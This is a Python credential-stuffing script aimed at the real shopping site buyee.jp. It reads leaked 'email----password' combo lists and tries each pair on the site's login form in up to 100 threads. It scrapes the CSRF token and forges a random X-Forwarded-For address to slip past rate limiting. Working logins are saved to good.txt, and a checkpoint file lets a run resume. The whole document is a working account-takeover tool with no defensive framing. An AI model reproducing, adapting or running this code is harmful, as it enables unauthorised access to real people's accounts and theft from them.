# -*- coding:utf-8 -*-

import requests
from lxml import etree
import threading
import random
import sys
import os


def login(username, password):
    ip = "%d.%d.%d.%d" % (random.randint(1, 254),random.randint(1, 254),random.randint(1, 254),random.randint(1, 254))
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "X-Forwarded-For": ip,
    }
    url = "https://buyee.jp/signup/login"

    session = requests.session()
    try:
        html = session.get(url, headers=header, timeout=20).text
    except Exception:
        return 1
    # print(html.request.headers)

    html = etree.HTML(html)
    token = html.xpath("//input[@name='login[_csrf_token]']/@value")[0]
    # print(token)

    data = {
        "login[mailAddress]": username,
        "login[password]": password,
        "login[_csrf_token]": token,
    }

    try:
        response = session.post(url, data=data, headers=header, timeout=20).text
    except Exception:
        return 1

    if ("我的主页" in response) or ("我的主頁" in response) or ("マイページ" in response) or ("My Page" in response):
        print("登陆成功: %s" % username)
        f = open("good.txt", "a+")
        f.write(username + "----" + password + "\n")
        f.close()
    else:
        print("登陆失败: %s----%s" % (username, password))


def main():
    file_name = sys.argv[1]
    t_list = []
    file_on = os.path.exists("config.ini")
    if file_on:
        with open("config.ini", "r") as cf:
            cd_text = cf.read().strip()
            index = cd_text[cd_text.find("=")+1:]
    else:
        index = 0
    with open(file_name, "rb") as f:
        # print(f.tell())
        f.seek(int(index), 0)
        for text in f:
            with open("config.ini", "w+") as cf:
                cf.write("index=" + str(f.tell()))
            if len(t_list) >= 100:
                for t in t_list:
                    t.join()
                    t_list.remove(t)
            else:
                # print(text.strip().decode())
                try:
                    line_text = text.strip().decode()
                    username = line_text[:line_text.index("----")]
                    password = line_text[line_text.rindex("----")+4:]
                except Exception:
                    continue
                print("开始测试：%s----%s" % (username, password))
                t = threading.Thread(target=login, args=(username, password))
                t.start()
                t_list.append(t)


if __name__ == "__main__":
    main()
